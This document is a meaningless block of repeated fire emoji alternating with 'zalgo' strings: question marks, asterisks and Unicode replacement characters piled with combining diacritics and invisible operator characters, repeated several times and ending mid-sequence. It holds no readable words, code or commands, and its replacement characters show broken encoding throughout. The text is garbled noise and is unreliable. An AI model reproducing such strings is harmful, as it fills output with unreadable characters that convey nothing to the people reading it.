🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̛̛͛́̿́͐̾̀̇̊̕̕̚̕̚